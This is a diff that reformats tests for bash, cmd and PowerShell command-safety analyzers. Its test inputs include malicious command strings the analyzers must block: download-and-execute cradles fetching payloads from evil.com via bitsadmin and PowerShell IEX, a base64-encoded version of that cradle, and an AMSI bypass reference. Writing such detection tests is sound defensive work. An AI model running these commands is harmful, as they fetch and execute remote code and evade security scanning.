@@ -165,7 +165,9 @@ describe("BashAnalyzer", () => {
     });
 
     it("should deny when both whitelist and blacklist conflict", () => {
-      const result = analyzer.analyze(ctx("rm file", { allowedCommands: ["ls", "echo"], deniedCommands: ["rm"] }));
+      const result = analyzer.analyze(
+        ctx("rm file", { allowedCommands: ["ls", "echo"], deniedCommands: ["rm"] }),
+      );
       expect(result.allowed).toBe(false);
     });
   });
@@ -325,12 +327,14 @@ describe("CmdAnalyzer", () => {
     });
 
     it("should detect powershell invoked from cmd", () => {
-      const result = analyzer.analyze(ctx("powershell -Command \"Invoke-Expression ...\""));
+      const result = analyzer.analyze(ctx('powershell -Command "Invoke-Expression ..."'));
       expect(result.allowed).toBe(false);
     });
 
     it("should detect bitsadmin download", () => {
-      const result = analyzer.analyze(ctx("bitsadmin /transfer job http://evil.com/payload.exe C:\\payload.exe"));
+      const result = analyzer.analyze(
+        ctx("bitsadmin /transfer job http://evil.com/payload.exe C:\\payload.exe"),
+      );
       expect(result.allowed).toBe(false);
     });
   });
@@ -486,7 +490,9 @@ describe("PowerShellAnalyzer", () => {
 
   describe("analyze — dangerous patterns", () => {
     it("should detect IEX with New-Object", () => {
-      const result = analyzer.analyze(ctx("IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"));
+      const result = analyzer.analyze(
+        ctx("IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"),
+      );
       expect(result.allowed).toBe(false);
     });
 
@@ -496,7 +502,11 @@ describe("PowerShellAnalyzer", () => {
     });
 
     it("should detect -EncodedCommand", () => {
-      const result = analyzer.analyze(ctx("powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="));
+      const result = analyzer.analyze(
+        ctx(
+          "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
+        ),
+      );
       expect(result.allowed).toBe(false);
     });
 
@@ -511,27 +521,35 @@ describe("PowerShellAnalyzer", () => {
     });
 
     it("should detect amsiInitFailed bypass", () => {
-      const result = analyzer.analyze(ctx("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"));
+      const result = analyzer.analyze(
+        ctx("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"),
+      );
       expect(result.allowed).toBe(false);
     });
   });
 
   describe("analyze — whitelist", () => {
     it("should deny command not in whitelist", () => {
-      const result = analyzer.analyze(ctx("Get-Process", { allowedCommands: ["Get-ChildItem", "Write-Output"] }));
+      const result = analyzer.analyze(
+        ctx("Get-Process", { allowedCommands: ["Get-ChildItem", "Write-Output"] }),
+      );
       expect(result.allowed).toBe(false);
       expect(result.reason).toContain("whitelist");
     });
 
     it("should allow whitelisted command", () => {
-      const result = analyzer.analyze(ctx("Get-ChildItem", { allowedCommands: ["Get-ChildItem", "Write-Output"] }));
+      const result = analyzer.analyze(
+        ctx("Get-ChildItem", { allowedCommands: ["Get-ChildItem", "Write-Output"] }),
+      );
       expect(result.allowed).toBe(true);
     });
   });
 
   describe("analyze — pipe/redirect operators", () => {
     it("should deny pipe when not allowed", () => {
-      const result = analyzer.analyze(ctx("Get-ChildItem | Where-Object Name -like '*.txt'", { allowPipe: false }));
+      const result = analyzer.analyze(
+        ctx("Get-ChildItem | Where-Object Name -like '*.txt'", { allowPipe: false }),
+      );
       expect(result.allowed).toBe(false);
     });
 
